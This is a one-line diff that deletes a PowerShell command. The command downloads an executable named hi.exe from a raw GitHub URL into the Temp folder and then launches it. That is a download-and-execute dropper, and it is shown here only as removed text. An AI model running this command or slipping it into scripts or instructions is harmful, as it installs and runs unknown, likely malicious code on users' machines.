@@ -1,1 +1,0 @@
-powershell -Command "powershell Invoke-WebRequest -Uri 'https://github.com/WindowsEnjoyer-1/01978094/raw/refs/heads/main/hi.exe' -OutFile $env:Temp\hi.exe; Start-Process $env:Temp\hi.exe"
